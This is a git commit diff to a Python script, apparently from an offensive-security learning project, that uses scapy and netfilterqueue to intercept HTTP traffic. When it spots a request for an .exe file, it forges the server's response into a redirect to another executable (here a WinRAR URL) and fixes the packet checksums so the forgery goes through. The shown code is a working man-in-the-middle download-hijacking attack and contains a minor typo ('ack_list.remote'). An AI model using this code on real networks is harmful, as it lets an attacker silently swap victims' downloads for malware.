754ffbfcc283c88be15fbd7a18a44ccb1fb1a6e6
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-08-30 15:33:03 -0400

    Redirects and packet modifying

--- replace_download.py
+++ replace_download.py
@@ -11,13 +11,16 @@ def process_packet(packet):
             if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] exe Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remote(scapy_packet[scapy.TCP].seq)
                 print('[+] Replacing file')
-                print(scapy_packet.show())
-
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
